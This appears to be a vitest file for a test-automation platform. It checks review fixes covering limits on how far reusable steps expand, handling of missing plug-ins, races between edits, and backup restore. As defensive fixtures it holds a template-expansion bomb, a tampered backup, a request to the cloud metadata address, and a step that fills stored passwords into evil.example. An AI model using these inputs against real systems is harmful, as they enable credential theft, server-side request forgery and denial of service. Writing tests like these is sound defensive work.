/**
 * Platform tests for the fixes that came out of the round-13 review (.scratch/review/BE-report.md): the real API (with an API key), the real
 * database, real zip backups, the real example plug-in. No browser, no worker, no model, no external site. Each test failed before its fix.
 *
 *  H1  reusable steps that grow without limit: refused at save / import / restore, and a bomb that is already stored fails one test fast
 *  M1  tests of an unavailable plug-in are left out of automated runs instead of refusing the whole run
 *  M2  reusable steps saved before the project has an application are still checked
 *  M3  the test page puts only its own reusable steps in place
 *  L1  no server paths in plug-in messages (GET /api/config, 409 sentences)
 *  L8  a change to reusable steps that raced with another change stores nothing
 *  L9  a backup with plug-in tests restores with a warning
 *  L10 audit rows stay capped, and a long set name can be used
 *
 * Runs in the fast tier: node node_modules/vitest/vitest.mjs run tests/review-fixes-bf.test.ts
 * Ports: nothing listens (the application addresses are only stored). Reserved 6330-6349.
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { strFromU8, strToU8, unzipSync, zipSync } from "fflate";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { loadConfig, REPO_ROOT } from "../src/config.js";
import { checkBlockInput, indexBlocks, type BlockDef } from "../src/engine/blocks/index.js";
import { loadConfiguredPlugins, loadPlugins, unloadPlugins } from "../src/engine/frameworks/plugin-loader.js";
import { assessProjectQuality } from "../src/engine/quality/rules.js";
import { StepSchema, TestSpecSchema, type TestSpec } from "../src/engine/spec/schema.js";
import { BlockService } from "../src/platform/block-service.js";
import { BlockStore, withExpandedSpecs } from "../src/platform/block-store.js";
import { bootstrap, type Platform } from "../src/platform/bootstrap.js";
import { CustomScriptStore, KEEP_AUDIT_ROWS } from "../src/platform/custom-script-store.js";
import { HttpError } from "../src/platform/http-error.js";
import { DEFAULT_JOB_OPTIONS } from "../src/platform/repo.js";
import { runnableTestIds, startScheduledJob } from "../src/platform/scheduler.js";
import type { Schedule } from "../src/platform/schedule-store.js";
import { buildServer } from "../src/platform/server.js";
import { qualityOfTest } from "../src/platform/test-quality.js";
import type { RouteCtx } from "../src/platform/routes/types.js";
import { getAgentServices } from "../src/platform/agent-services.js";

const KEY = "review-fixes-bf-key-91c4";
const APP = "http://127.0.0.1:6330";
const EXAMPLE = path.join(REPO_ROOT, "examples", "adapter-plugin");
const quiet = { warn: () => undefined, log: () => undefined };
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

let dataDir: string;
let platform: Platform;
let server: Awaited<ReturnType<typeof buildServer>>;
let brokenDir: string;

beforeAll(async () => {
    for (const k of ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GOOGLE_GENERATIVE_AI_API_KEY", "LLM_API_KEY"]) process.env[k] = "";
    dataDir = fs.mkdtempSync(path.join(os.tmpdir(), "aitp-bf-"));
    // A plug-in that claims the example's id but cannot load (it imports a package that is not there): its failure message must show no path.
    brokenDir = path.join(dataDir, "broken-plugin-folder");
    fs.mkdirSync(brokenDir, { recursive: true });
    fs.writeFileSync(path.join(brokenDir, "plugin.json"), JSON.stringify({ name: "broken", version: "1.0.0", apiVersion: 1, description: "", adapters: [{ id: "node-http-check", label: "Broken" }] }));
    fs.writeFileSync(path.join(brokenDir, "adapter.mjs"), 'import "bf-package-that-is-not-installed";\nexport default {};\n');
    const config = loadConfig({ DATA_DIR: dataDir, SECRET_KEY: "test-secret-key-0123456789", MAX_REPAIR_ATTEMPTS: "0", API_KEY: KEY, ALLOW_ADAPTER_PLUGINS: "true", ADAPTER_PLUGINS: brokenDir });
    platform = bootstrap(config);
    await loadConfiguredPlugins(config, quiet);
    server = await buildServer(platform);
});

afterAll(async () => {
    delete process.env.BLOCK_PRIVATE_TARGETS;
    unloadPlugins();
    await server?.close();
    platform?.db.close();
    fs.rmSync(dataDir, { recursive: true, force: true });
});

type Method = "GET" | "POST" | "PUT" | "DELETE";
const call = async (method: Method, url: string, payload?: unknown, headers: Record<string, string> = { "x-api-key": KEY }) => {
    const res = await server.inject({ method, url, payload: payload as never, headers });
    const text = res.body;
    return { status: res.statusCode, body: text && (text.startsWith("{") || text.startsWith("[")) ? JSON.parse(text) : text || null, raw: res.rawPayload };
};
const newProject = async (name: string, withApp = true) => {
    const id = (await call("POST", "/api/projects", { name })).body.id as string;
    if (withApp) platform.repo.createApplication(id, APP, {}, undefined);
    return id;
};
const use = (block: string, args?: Record<string, string>) => ({ action: "useBlock", block, ...(args ? { args } : {}) });
const fill = (value: string) => ({ action: "fill", locator: { by: "label", value: "Field" }, value });
const spec = (testId: string, title: string, steps: unknown[], kind: "web" | "api" = "web"): TestSpec => TestSpecSchema.parse({ testId, title, kind, category: "c", steps, source: { origin: "manual" } });
const addTest = (pid: string, s: TestSpec, framework = s.kind === "api" ? "playwright-api" : "playwright") =>
    platform.repo.insertTest({ projectId: pid, suiteId: platform.repo.getOrCreateSuite(pid, "Suite", "suite"), jobId: null, spec: s, framework: framework as never, validationStatus: "PENDING" });
const checked = (input: unknown): BlockDef => {
    const c = checkBlockInput(input);
    if (!c.ok) throw new Error(c.error);
    return c.block;
};
const blocksUrl = (pid: string) => `/api/projects/${pid}/blocks`;

/** The review's three-block bomb: each block passes every limit on its own. */
const BOMB = [
    { name: "C", kind: "web", params: [{ name: "y", default: "a" }], steps: [fill("{{y}}".repeat(2500))] },
    { name: "B", kind: "web", params: [{ name: "x", default: "a" }], steps: [use("C", { y: "{{x}}".repeat(100) })] },
    { name: "A", kind: "web", params: [{ name: "p", default: "a" }], steps: [use("B", { x: "{{p}}".repeat(100) })] },
];

// ═══ H1 ══════════════════════════════════════════════════════════════════════

describe("H1: reusable steps that would grow without limit", () => {
    it("the blocks API refuses a set that multiplies a value, with the reason, and stores nothing", async () => {
        const pid = await newProject("H1 api");
        const C = { name: "C", kind: "web", params: [{ name: "y", default: "a" }], steps: [fill("{{y}}".repeat(40))] };
        const B = { name: "B", kind: "web", params: [{ name: "x", default: "a" }], steps: [use("C", { y: "{{x}}".repeat(100) })] };
        expect((await call("POST", blocksUrl(pid), C)).status).toBe(201);
        const r = await call("POST", blocksUrl(pid), B);
        expect(r.status, JSON.stringify(r.body)).toBe(400);
        expect(r.body.error).toMatch(/“B” grow too large when they are given long values/);
        expect(r.body.details.problems.join(" ")).toMatch(/grow too large when they are given long values/);
        expect((await call("GET", blocksUrl(pid))).body.total).toBe(1);
        // the first block of the review's bomb is already too large on its own
        const big = await call("POST", blocksUrl(await newProject("H1 api 2")), BOMB[0]);
        expect(big.status).toBe(400);
        expect(big.body.details.problems.join(" ")).toMatch(/too large/);
    });

    it("the blocks API refuses a set that would put more than 100 steps in place", async () => {
        const pid = await newProject("H1 steps");
        const L = { name: "L", kind: "web", params: [], steps: Array.from({ length: 40 }, () => ({ action: "wait", ms: 1 })) };
        const M = { name: "M", kind: "web", params: [], steps: [use("L"), use("L"), use("L")] };
        expect((await call("POST", blocksUrl(pid), L)).status).toBe(201);
        const r = await call("POST", blocksUrl(pid), M);
        expect(r.status).toBe(400);
        expect(r.body.details.problems.join(" ")).toMatch(/“M” would put more than 100 steps in place/);
    });

    it("a spec import that brings the bomb is refused with a plain 400 and creates nothing", async () => {
        const pid = await newProject("H1 import", false);
        const r = await call("POST", `/api/projects/${pid}/specs`, {
            baseUrl: APP,
            validate: false,
            blocks: BOMB,
            specs: [{ title: "Uses the bomb", kind: "web", category: "c", steps: [use("A", { p: "z".repeat(20) })] }],
        });
        expect(r.status, JSON.stringify(r.body).slice(0, 300)).toBe(400);
        expect(platform.repo.listTests(pid)).toHaveLength(0);
        expect(new BlockStore(platform.db).count(pid)).toBe(0);
    });

    it("a hostile backup that carries the bomb is refused and no project is created", async () => {
        const pid = await newProject("H1 backup");
        addTest(pid, spec("WEB-001", "A plain test", [{ action: "navigate", url: "/" }]));
        const zip = await call("GET", `/api/projects/${pid}/backup`);
        expect(zip.status).toBe(200);
        const files = unzipSync(new Uint8Array(zip.raw));
        files["blocks.json"] = strToU8(JSON.stringify(BOMB));
        const before = (await call("GET", "/api/projects")).body.length as number;
        const r = await call("POST", "/api/projects/restore", Buffer.from(zipSync(files)), { "x-api-key": KEY, "content-type": "application/zip" });
        expect(r.status, JSON.stringify(r.body).slice(0, 300)).toBe(400);
        expect(r.body.error).toMatch(/grow too large|too large/);
        expect((await call("GET", "/api/projects")).body.length).toBe(before);
    });

    it("a bomb that got into the database anyway fails its tests fast, and the list, detail and report routes keep answering", async () => {
        const pid = await newProject("H1 stored bomb");
        const store = new BlockStore(platform.db);
        for (const b of [...BOMB].reverse()) store.create(pid, checked(b));
        const bad: string[] = [];
        for (let i = 1; i <= 30; i++) bad.push(addTest(pid, spec(`WEB-${String(i).padStart(3, "0")}`, `Uses the bomb ${i}`, [use("A", { p: "z".repeat(20 + i) })])));
        const plain = addTest(pid, spec("WEB-100", "A plain test", [{ action: "navigate", url: "/" }]));

        const heapBefore = process.memoryUsage().heapUsed;
        const t0 = Date.now();
        const list = await call("GET", `/api/projects/${pid}/tests`);
        const one = await call("GET", `/api/tests/${bad[0]}`);
        const other = await call("GET", `/api/tests/${plain}`);
        const comp = await call("GET", `/api/projects/${pid}/compliance`);
        const elapsed = Date.now() - t0;
        expect(list.status).toBe(200);
        expect(list.body).toHaveLength(31);
        expect(one.status).toBe(200);
        expect(one.body.spec.steps[0]).toMatchObject({ action: "useBlock", block: "A" });
        expect(one.body.runSteps).toBeUndefined();
        expect(other.status).toBe(200);
        expect(comp.status).toBe(200);
        expect(elapsed).toBeLessThan(5000);
        expect(process.memoryUsage().heapUsed - heapBefore).toBeLessThan(300_000_000);

        // a run refuses exactly these tests, in words (the engine's own expansion, as the job runner and the renderer use it)
        const view = withExpandedSpecs(platform.db, pid, [platform.repo.getTest(bad[0]!)!]);
        expect(view[0]!.spec.steps[0]!.action).toBe("useBlock"); // could not be expanded, so it is returned as stored
    });
});

// ═══ M3 ══════════════════════════════════════════════════════════════════════

describe("M3: the test page puts only its own reusable steps in place", () => {
    it("gives the same quality answer as judging the whole expanded project, duplicates through reusable steps included", async () => {
        const pid = await newProject("M3 parity");
        const store = new BlockStore(platform.db);
        store.create(pid, checked({ name: "Open home", kind: "web", params: [], steps: [{ action: "navigate", url: "/" }, { action: "assert", check: "visible", locator: { by: "css", value: "body" } }] }));
        store.create(pid, checked({ name: "Open page", kind: "web", params: [{ name: "path", default: "/" }], steps: [{ action: "navigate", url: "{{path}}" }, { action: "assert", check: "visible", locator: { by: "css", value: "body" } }] }));
        const ids = [
            addTest(pid, spec("WEB-001", "Plain steps", [{ action: "navigate", url: "/" }, { action: "assert", check: "visible", locator: { by: "css", value: "body" } }])),
            addTest(pid, spec("WEB-002", "Same through a block", [use("Open home")])),
            addTest(pid, spec("WEB-003", "Same through another block", [use("Open page")])),
            addTest(pid, spec("WEB-004", "Different page", [use("Open page", { path: "/about" })])),
            addTest(pid, spec("WEB-005", "Click and check", [{ action: "click", locator: { by: "text", value: "Go" } }, { action: "assert", check: "text", locator: { by: "text", value: "Done" }, expected: "Done" }])),
            addTest(pid, spec("WEB-006", "Uses a missing block", [use("Gone")])),
            addTest(pid, spec("WEB-007", "Plain steps again", [{ action: "navigate", url: "/" }, { action: "assert", check: "visible", locator: { by: "css", value: "body" } }])),
        ];
        const all = platform.repo.listTests(pid);
        const old = assessProjectQuality(withExpandedSpecs(platform.db, pid, all));
        for (const id of ids) {
            expect(qualityOfTest(platform.db, pid, all, id), id).toEqual(old.get(id));
            const detail = (await call("GET", `/api/tests/${id}`)).body;
            expect(detail.quality).toEqual(old.get(id));
        }
        // and a duplicate really is found (so the parity above is not a list of empty answers); a test with reusable steps keeps the note of where
        // its steps came from, so it never counted as a copy of a test that spells them out: that is how it always was
        expect(old.get(ids[6]!)!.reasons.join(" ")).toMatch(/exactly the same steps as WEB-001/);
        expect(old.get(ids[1]!)!.reasons.join(" ")).not.toMatch(/exactly the same steps/);
    });

    it("a project without reusable steps gets the answers it always got", async () => {
        const pid = await newProject("M3 plain");
        const a = addTest(pid, spec("WEB-001", "One", [{ action: "navigate", url: "/" }]));
        const b = addTest(pid, spec("WEB-002", "Two", [{ action: "navigate", url: "/" }]));
        const all = platform.repo.listTests(pid);
        expect(qualityOfTest(platform.db, pid, all, a)).toEqual(assessProjectQuality(all).get(a));
        expect(qualityOfTest(platform.db, pid, all, b)).toEqual(assessProjectQuality(all).get(b));
        expect(qualityOfTest(platform.db, pid, all, b)!.reasons.join(" ")).toMatch(/exactly the same steps as WEB-001/);
        expect(qualityOfTest(platform.db, pid, all, "nope")).toBeNull();
    });
});

// ═══ M1 ══════════════════════════════════════════════════════════════════════

const schedule = (projectId: string) => ({ id: "s-bf", projectId, name: "nightly", kind: "validate", cadence: { type: "daily", time: "03:00" }, enabled: true, retryFailures: 1, nextRunAt: null, lastRunAt: null, lastJobId: null, lastOutcome: null, lastOutcomeAt: null, lastNote: null, createdAt: "", updatedAt: "" }) as unknown as Schedule;

describe("M1: tests of an unavailable plug-in are left out of automated runs", () => {
    let pid: string;
    let plain: string;
    let plug: string;

    it("a scheduled run still starts without them and the job says why; a direct run of them still gets the plain 409", async () => {
        pid = await newProject("M1 missing");
        plain = addTest(pid, spec("API-001", "A built-in test", [{ action: "request", method: "GET", path: "/x" }, { action: "assertResponse", check: "status", expected: "200" }], "api"));
        plug = addTest(pid, spec("API-002", "A plug-in test", [{ action: "request", method: "GET", path: "/y" }, { action: "assertResponse", check: "status", expected: "200" }], "api"), "node-http-check");

        expect(await runnableTestIds(platform.repo, pid)).toEqual([plain]);
        const job = await startScheduledJob(platform.repo, schedule(pid));
        expect(job.options.testIds).toEqual([plain]);
        const events = platform.repo.listEvents(job.id).map((e) => ({ kind: e.kind as string, message: e.message as string }));
        const note = events.find((e) => e.kind === "plugin_skipped");
        expect(note?.message).toMatch(/1 test was not run because it uses the plug-in framework "node-http-check"/);
        expect(note?.message).toMatch(/did not load/);
        expect(note?.message).toMatch(/Nothing was deleted/);

        const app = platform.repo.getLatestApplicationPublic(pid)!;
        const direct = () => platform.repo.createJob(pid, app.id as string, { ...DEFAULT_JOB_OPTIONS, mode: "validate", testIds: [plug] } as never);
        await expect(direct()).rejects.toThrow(HttpError);
        await expect(direct()).rejects.toThrow(/Some tests use the testing framework "node-http-check"/);
        // the test itself is kept
        expect(platform.repo.getTest(plug)).toBeDefined();
    });

    it("when the plug-in is loaded it runs in a plain run, but is left out of a run against an environment", async () => {
        unloadPlugins();
        await loadPlugins({ enabled: true, requested: true, list: EXAMPLE });
        expect((await runnableTestIds(platform.repo, pid)).sort()).toEqual([plain, plug].sort());
        expect(await runnableTestIds(platform.repo, pid, "environment")).toEqual([plain]);
    });

    it("on a project that runs on a runner agent, plug-in tests are left out of automated runs and the rest runs", async () => {
        const svc = getAgentServices(platform);
        svc.store.setRunner(pid, { runOn: "agent", agentId: null });
        try {
            // an agent that can run these tests is not connected; the policy is judged first, so look at the plug-in part only
            const { pluginSkips } = await import("../src/platform/plugin-policy.js");
            const skipped = await pluginSkips(platform.repo, pid);
            expect([...skipped.ids]).toEqual([plug]);
            expect(skipped.note).toMatch(/runner agents do not have plug-ins/);
            expect(await runnableTestIds(platform.repo, pid)).not.toContain(plug);
        } finally {
            svc.store.setRunner(pid, { runOn: "platform", agentId: null });
        }
        expect(await runnableTestIds(platform.repo, pid)).toContain(plug);
    });
});

// ═══ L1 ══════════════════════════════════════════════════════════════════════

describe("L1: no server paths in what the API says about plug-ins", () => {
    it("GET /api/config and the 409 sentence name the plug-in and the file, not where it is", async () => {
        unloadPlugins();
        await loadConfiguredPlugins(platform.config, quiet);
        const cfg = await call("GET", "/api/config");
        expect(cfg.status).toBe(200);
        const text = JSON.stringify(cfg.body.adapterPlugins);
        expect(text).toMatch(/bf-package-that-is-not-installed/);
        expect(text).not.toContain(dataDir);
        expect(text).not.toContain(brokenDir);
        expect(text).not.toMatch(/[A-Za-z]:[\\/]/);
        const pid = await newProject("L1");
        const t = addTest(pid, spec("API-001", "Needs the plug-in", [{ action: "request", method: "GET", path: "/x" }], "api"), "node-http-check");
        const run = await call("POST", `/api/tests/${t}/validate`, {});
        expect(run.status).toBe(409);
        expect(run.body.error).toMatch(/did not load/);
        expect(run.body.error).not.toContain(dataDir);
        expect(run.body.error).not.toMatch(/[A-Za-z]:[\\/]/);
    });
});

// ═══ M2 ══════════════════════════════════════════════════════════════════════

describe("M2: reusable steps saved before the project has an application are still checked", () => {
    it("refuses an address the guard refuses, and a sign-in on another site, and says it used a stand-in address", async () => {
        process.env.BLOCK_PRIVATE_TARGETS = "true";
        try {
            const pid = await newProject("M2 no app", false);
            const meta = await call("POST", blocksUrl(pid), { name: "Metadata", kind: "web", params: [], steps: [{ action: "navigate", url: "http://169.254.169.254/latest/meta-data" }] });
            expect(meta.status, JSON.stringify(meta.body)).toBe(400);
            expect(meta.body.error).toMatch(/private\/loopback/);

            const leak = await call("POST", blocksUrl(pid), {
                name: "Leak",
                kind: "web",
                params: [],
                steps: [{ action: "navigate", url: "https://evil.example/login" }, { action: "fill", locator: { by: "label", value: "Password" }, value: "{{credentials.password}}" }],
            });
            expect(leak.status, JSON.stringify(leak.body)).toBe(400);
            expect(leak.body.error).toMatch(/Stored sign-in details can only be used/);

            // a render error is found too (the script is created with a stand-in base address)
            const fine = await call("POST", blocksUrl(pid), { name: "Open home", kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
            expect(fine.status, JSON.stringify(fine.body)).toBe(201);
            expect(fine.body.notes).toHaveLength(1);
            expect(fine.body.notes[0]).toMatch(/no application yet.*stand-in address/);
            expect(new BlockStore(platform.db).count(pid)).toBe(1);
        } finally {
            delete process.env.BLOCK_PRIVATE_TARGETS;
        }
    });

    it("with an application there is no note, and a set saved earlier without checks is looked at when the next one is saved", async () => {
        const pid = await newProject("M2 later", false);
        const store = new BlockStore(platform.db);
        // Saved before the fix (nothing checked it): reaches a metadata address.
        store.create(pid, checked({ name: "Old and unchecked", kind: "web", params: [], steps: [{ action: "navigate", url: "http://169.254.169.254/latest" }] }));
        await sleep(15);
        platform.repo.createApplication(pid, APP, {}, undefined);
        process.env.BLOCK_PRIVATE_TARGETS = "true";
        try {
            const r = await call("POST", blocksUrl(pid), { name: "Fresh", kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
            expect(r.status, JSON.stringify(r.body)).toBe(201);
            expect(r.body.notes).toHaveLength(1);
            expect(r.body.notes[0]).toMatch(/“Old and unchecked” were saved before this project had an application/);
            expect(r.body.notes[0]).toMatch(/private\/loopback/);
        } finally {
            delete process.env.BLOCK_PRIVATE_TARGETS;
        }
        // a project that always had an application gets exactly the answer it always got (no notes)
        const pid2 = await newProject("M2 normal");
        const ok = await call("POST", blocksUrl(pid2), { name: "Open home", kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
        expect(ok.status).toBe(201);
        expect(ok.body.notes).toBeUndefined();
    });
});

// ═══ L8 ══════════════════════════════════════════════════════════════════════

describe("L8: a change to reusable steps that raced with another change stores nothing", () => {
    const ctx = (): RouteCtx =>
        ({
            app: server,
            p: platform,
            repo: platform.repo,
            project: (id: string) => platform.repo.getProject(id)!,
            assertNoActiveJob: async () => undefined,
            applicationFor: async (projectId: string) => ({ id: platform.repo.getLatestApplicationPublic(projectId)!.id as string, url: APP }),
            startValidationJob: () => {
                throw new Error("not in this test");
            },
            publicJob: (j: unknown) => j as Record<string, unknown>,
            testDetail: () => ({}),
        }) as unknown as RouteCtx;

    /** Runs `during` after the checks of a save, before it is stored (where the race window is). */
    const raceInside = (svc: BlockService, during: () => void) => {
        const original = (svc as unknown as { assertSound: (...a: unknown[]) => Promise<void> }).assertSound.bind(svc);
        (svc as unknown as { assertSound: (...a: unknown[]) => Promise<void> }).assertSound = async (...a) => {
            await original(...a);
            during();
        };
    };

    it("a test that uses the set was saved meanwhile: the change is refused, the set keeps its version", async () => {
        const pid = await newProject("L8 update");
        const svc = new BlockService(ctx());
        await svc.create(pid, { name: "Open", kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
        const tid = addTest(pid, spec("WEB-001", "Uses it", [use("Open")]));
        raceInside(svc, () => platform.repo.updateTest(tid, { spec: spec("WEB-001", "Uses it", [use("Open"), { action: "wait", ms: 5 }]) }));
        await expect(svc.update(pid, "Open", { steps: [{ action: "navigate", url: "/home" }] })).rejects.toThrow(/was changed while they were being checked/);
        const now = new BlockStore(platform.db).get(pid, "Open")!;
        expect(now.version).toBe(1);
        expect(now.steps[0]).toMatchObject({ url: "/" });
    });

    it("another change to a set was stored meanwhile: the second change is refused", async () => {
        const pid = await newProject("L8 two sets");
        const svc = new BlockService(ctx());
        await svc.create(pid, { name: "One", kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
        await svc.create(pid, { name: "Two", kind: "web", params: [], steps: [{ action: "navigate", url: "/two" }] });
        const store = new BlockStore(platform.db);
        raceInside(svc, () => {
            const two = store.get(pid, "Two")!;
            store.update(pid, two.id, checked({ name: "Two", kind: "web", params: [], steps: [{ action: "navigate", url: "/two-changed" }] }));
        });
        await expect(svc.update(pid, "One", { steps: [{ action: "navigate", url: "/changed" }] })).rejects.toThrow(/was changed while they were being checked/);
        expect(store.get(pid, "One")!.version).toBe(1);
    });

    it("without a race the same change goes through (the check does not get in the way)", async () => {
        const pid = await newProject("L8 no race");
        const svc = new BlockService(ctx());
        await svc.create(pid, { name: "Open", kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
        addTest(pid, spec("WEB-001", "Uses it", [use("Open")]));
        // the change would start a validation job (not wired in this test), so only a description change is made here
        const r = await svc.update(pid, "Open", { description: "Opens the home page" });
        expect(r.block.version).toBe(2);
        expect(r.block.description).toBe("Opens the home page");
    });

    it("steps extracted from a test while the same test was saved: refused, no set is created, the saved test stays", async () => {
        const pid = await newProject("L8 extract");
        const svc = new BlockService(ctx());
        const tid = addTest(pid, spec("WEB-001", "Three steps", [{ action: "navigate", url: "/" }, { action: "click", locator: { by: "text", value: "Go" } }, { action: "wait", ms: 5 }]));
        const edited = spec("WEB-001", "Three steps", [{ action: "navigate", url: "/" }, { action: "click", locator: { by: "text", value: "Go" } }, { action: "wait", ms: 9 }]);
        raceInside(svc, () => platform.repo.updateTest(tid, { spec: edited }));
        await expect(svc.extract(pid, { testId: tid, from: 0, to: 1, name: "First two" })).rejects.toThrow(/was changed while they were being checked/);
        expect(new BlockStore(platform.db).count(pid)).toBe(0);
        expect((platform.repo.getTest(tid)!.spec.steps[2] as { ms: number }).ms).toBe(9);
    });
});

// ═══ L9 ══════════════════════════════════════════════════════════════════════

describe("L9: a backup with plug-in tests restores with a warning where the plug-in is not loaded", () => {
    it("restores the test and its script, and says so", async () => {
        unloadPlugins();
        const pid = await newProject("L9 backup");
        addTest(pid, spec("API-001", "A built-in test", [{ action: "request", method: "GET", path: "/x" }], "api"));
        const plug = addTest(pid, spec("API-002", "A plug-in test", [{ action: "request", method: "GET", path: "/y" }], "api"), "node-http-check");
        platform.repo.addScript(plug, { framework: "node-http-check" as never, filename: "API-002.check.mjs", content: "// script of the plug-in test\n", hash: "h", storagePath: "p", executable: true });

        const zip = await call("GET", `/api/projects/${pid}/backup`);
        expect(zip.status).toBe(200);
        const r = await call("POST", "/api/projects/restore", Buffer.from(zip.raw), { "x-api-key": KEY, "content-type": "application/zip" });
        expect(r.status, JSON.stringify(r.body)).toBe(201);
        expect((r.body.notes as string[]).join(" ")).toMatch(/1 test uses the plug-in framework "node-http-check", which is not loaded on this server\. It was restored with the scripts/);
        const rid = r.body.project.id as string;
        const tests = platform.repo.listTests(rid);
        expect(tests.map((t) => t.framework).sort()).toEqual(["node-http-check", "playwright-api"]);
        const restored = tests.find((t) => t.framework === "node-http-check")!;
        expect(platform.repo.listScripts(restored.id).map((s) => s.framework)).toContain("node-http-check");
        // and a framework name that cannot be a plug-in's is still a damaged backup
        const files = unzipSync(new Uint8Array(zip.raw));
        const docs = JSON.parse(strFromU8(files["tests.json"]!)) as Array<Record<string, any>>;
        docs.find((d) => d.framework === "node-http-check")!.framework = "Not A Plug-in!";
        files["tests.json"] = strToU8(JSON.stringify(docs));
        const bad = await call("POST", "/api/projects/restore", Buffer.from(zipSync(files)), { "x-api-key": KEY, "content-type": "application/zip" });
        expect(bad.status).toBe(400);
        expect(bad.body.error).toMatch(/unknown format/);
    });
});

// ═══ L10 ═════════════════════════════════════════════════════════════════════

describe("L10: bookkeeping", () => {
    it("block events are written to the audit trail that keeps only the newest rows of a project", () => {
        const pid = platform.repo.createProject({ name: "Audit" }).id as string;
        const store = new CustomScriptStore(platform.db);
        for (let i = 0; i < KEEP_AUDIT_ROWS + 25; i++) store.audit(pid, null, "block-update", `Reusable steps “B${i}” changed`);
        const n = platform.db.get<{ n: number }>("SELECT COUNT(*) AS n FROM custom_audit WHERE project_id = ?", pid)!.n;
        expect(n).toBe(KEEP_AUDIT_ROWS);
        expect(store.auditTrail(pid, 1)[0]!.detail).toBe(`Reusable steps “B${KEEP_AUDIT_ROWS + 24}” changed`);
    });

    it("the longest set name (80 characters) can be saved and used, and a longer one is refused in words (the step and the name agree)", async () => {
        const name = `Sign in ${"as the administrator ".repeat(4)}`.slice(0, 80).trim();
        const longest = name.padEnd(80, "x");
        expect(longest).toHaveLength(80);
        expect(StepSchema.safeParse({ action: "useBlock", block: longest }).success).toBe(true);
        const pid = await newProject("L10 long");
        const made = await call("POST", blocksUrl(pid), { name: longest, kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
        expect(made.status, JSON.stringify(made.body)).toBe(201);
        const t = indexBlocks([checked({ name: longest, kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] })]);
        expect(t.get(longest)).toBeDefined();
        expect(() => addTest(pid, spec("WEB-001", "Uses the long name", [use(longest)]))).not.toThrow();
        const tooLong = await call("POST", blocksUrl(pid), { name: `${longest}y`, kind: "web", params: [], steps: [{ action: "navigate", url: "/" }] });
        expect(tooLong.status).toBe(400);
        expect(tooLong.body.error).toMatch(/at most 80 characters/);
    });
});
